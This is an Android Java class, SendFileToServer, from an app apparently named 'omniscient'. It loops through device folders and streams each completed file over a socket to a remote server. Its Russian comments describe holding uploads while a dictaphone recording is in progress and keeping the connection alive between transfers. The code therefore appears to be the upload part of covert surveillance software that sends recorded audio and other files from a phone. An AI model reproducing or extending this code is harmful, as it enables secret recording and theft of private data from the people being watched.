package com.postal.omniscient.postal.downloadFiles;

import android.util.Log;

import com.postal.omniscient.postal.ThreadIsAliveOrNot;
import com.postal.omniscient.postal.adapter.AdapterDownloadFlag;
import com.postal.omniscient.postal.adapter.EventBusData;

import org.greenrobot.eventbus.EventBus;
import org.greenrobot.eventbus.Subscribe;
import org.greenrobot.eventbus.ThreadMode;

import java.io.BufferedInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.net.Socket;

/**
 * Created by Александр on 10.07.2016.
 */
public class SendFileToServer extends Thread {
    private final AdapterDownloadFlag is_downloadFlag;
    private File[] allFoldersFiles;
    private Socket socket;
    private DataOutputStream dos;
    private String Msg = "MyMsg";

    public SendFileToServer(File[] allFoldersFiles, Socket socket,
                            DataOutputStream dos, AdapterDownloadFlag is_downloadFlag) {
        this.allFoldersFiles =allFoldersFiles;
        this.socket = socket;
        this.dos = dos;
        this.is_downloadFlag = is_downloadFlag;

    }

    private void sendData (){
        Log.d(Msg, "START DOWNLOAD FILES ");

        File f2;
        File[] files;
        for (File directory : allFoldersFiles) {
            if (directory.isDirectory()) {
                Log.i(Msg, "is directory " + directory.toString());
                f2 = new File(directory.toString());
                files = f2.listFiles();
                for (File inFiles_in : files) {
                    if (inFiles_in.isFile()) {
                        Log.i(Msg, "is file " + inFiles_in.toString());
                        //файлы отправляются если существуют ) если файл еще пишется пропускаем его!
                        if(!(inFiles_in.getName().toString()).startsWith("no_written")) {
                            send(inFiles_in.getName().toString(), directory.getName().toString(), inFiles_in.toString());
                        }
                    }
                }
            }
        }
    }

    public void send(String file_Name, String folder_Name, String patch) {
        try {
            //outputStream.write((text + CRLF).getBytes());

            String fileName = file_Name;
            File myFile = new File(patch );
            BufferedInputStream bis = new BufferedInputStream(new FileInputStream(patch));
            long expect = myFile.length();

            byte[] buffer = new byte[1024*8];//socket.getSendBufferSize()];

            dos.writeUTF(file_Name);
            dos.writeUTF(folder_Name);
            dos.writeLong(expect);
            Log.i("MyMsg", "File  "+file_Name+" Bite "+expect);
            long left = expect;
            int inlen = 0;
            while (left > 0 && (inlen = bis.read(buffer, 0, (int)Math.min(left, buffer.length))) >= 0) {
                dos.write(buffer, 0, inlen);
                left -= inlen;
            }

            bis.close();
            dos.flush();
        } catch (IOException ex) {
            // notifyObservers(ex);
        }
    }
    @Override
    public void run() {
        Log.i(Msg, "TRANSFER TREE START");
        is_downloadFlag.setTreadIsWork(true);// не отсылать бин инфы на сервер для поддержания конекта

        //когда диктофон не работает можно отправлять данные (что бы не отправлять запись во время записи)
        //на DictaphoneRecordStop потомучто DictaphoneRecord не работает во время записи
       // if(!new ThreadIsAliveOrNot("DictaphoneRecordStop").liveORnot()) {
            sendData();
        //}
        is_downloadFlag.setTreadIsWork(false);
        //начать отсылку битов для поддержки конекта
//если не работает кип конекшн
        try {
            if(!new ThreadIsAliveOrNot("KeepConnection").liveORnot()) {
                dos.writeUTF("isConnect");
                dos.flush();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }



        Log.i(Msg, "TRANSFER TREE END");
    }
}
